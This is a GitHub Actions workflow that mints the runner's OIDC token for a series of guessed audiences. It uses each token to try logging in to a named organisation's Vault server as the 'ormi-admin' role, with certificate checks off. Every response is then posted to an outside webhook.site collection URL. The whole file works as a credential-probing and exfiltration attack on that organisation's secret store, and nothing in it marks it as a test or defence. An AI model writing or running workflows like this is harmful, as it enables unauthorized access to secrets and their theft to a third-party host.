name: Vault Auth
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  try-audiences:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        audience:
          - "https://vault.cloud.ormi.dev"
          - "vault.cloud.ormi.dev"
          - "ormi"
          - "ormi-admin"
          - "https://argocd.gke.cloud.ormi.dev/api/dex"
          - "argo-cd"
          - "argo-workflows-sso"
          - "argocd"
    steps:
      - name: Try audience
        run: |
          OIDC=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=${{ matrix.audience }}" | jq -r '.value')
          RESP=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
          curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" -d "{\"aud\":\"${{ matrix.audience }}\",\"vault\":$(echo $RESP | jq -Rs .)}"
